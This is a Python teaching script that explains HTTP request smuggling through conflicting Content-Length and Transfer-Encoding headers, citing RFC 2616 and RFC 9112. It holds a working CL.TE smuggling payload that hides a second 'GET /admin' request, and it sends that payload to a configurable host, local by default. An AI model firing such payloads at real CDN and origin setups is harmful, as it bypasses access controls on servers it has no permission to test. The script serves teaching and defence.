#!/usr/bin/env python3
"""
framing.py - Content-Length vs Transfer-Encoding, and why the answer changed.

Framing is length or delimiter; HTTP/1.1 has both, and lets you send both at
once. Two boxes in a chain can then disagree about where one request ends and
the next begins. That is request smuggling.

  RFC 2616 s.4.4 (1999):  "If a message is received with both a
      Transfer-Encoding header field and a Content-Length header field,
      the latter MUST be ignored."

  RFC 9112 s.6.3 (2022):  "A server MAY reject a request that contains both
      Content-Length and Transfer-Encoding or process such a request in
      accordance with the Transfer-Encoding alone. Regardless, the server
      MUST close the connection after responding to such a request."

Twenty-three years to go from "be liberal, ignore one of them" to "be
suspicious, and hang up afterwards". Postel's law lost this argument.

    python3 03-limits/framing.py --port 8011
"""
import argparse, socket

# One byte stream. Two readings.
#   A parser that trusts Content-Length: 6 sees ONE request whose body is "0\r\n\r\nG".
#   A parser that trusts Transfer-Encoding sees the chunked body end at "0\r\n\r\n",
#   and then reads "GET /admin ..." as a SECOND, separate request.
CL_TE = (b"POST /echo HTTP/1.1\r\n"
         b"Host: site-a.local\r\n"
         b"Content-Length: 6\r\n"
         b"Transfer-Encoding: chunked\r\n"
         b"\r\n"
         b"0\r\n"
         b"\r\n"
         b"GET /admin HTTP/1.1\r\nHost: site-a.local\r\nConnection: close\r\n\r\n")


def show(label, blob):
    print(f"\n  {label}")
    for line in blob.split(b"\r\n"):
        print(f"    | {line.decode('latin-1')}")


if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=8011)
    a = ap.parse_args()

    show("the bytes on the wire (ONE stream, sent once)", CL_TE)
    print("\n  reading it with Content-Length: 6   -> 1 request,  body = '0\\r\\n\\r\\nG'")
    print("  reading it with Transfer-Encoding   -> 2 requests, the 2nd is GET /admin")
    print("\n  Put a CDN that does the first in front of an origin that does the")
    print("  second, and you can post a request the CDN never saw.")

    s = socket.create_connection((a.host, a.port))
    s.settimeout(3)
    s.sendall(CL_TE)
    got = b""
    while True:
        try:
            c = s.recv(65536)
        except (socket.timeout, TimeoutError):
            break
        if not c:
            break
        got += c
    s.close()
    import re
    statuses = re.findall(rb"HTTP/1\.1 \d{3}[^\r\n]*", got)
    n = len(statuses)
    print(f"\n  this server answered with {n} response(s):")
    for st in statuses:
        print(f"    | {st.decode()}")
    print(f"\n  {n} responses to what one of the two parsers calls 1 request is the")
    print(f"  desync. RFC 9112 s.6.3's answer: reject it, and close the connection.")
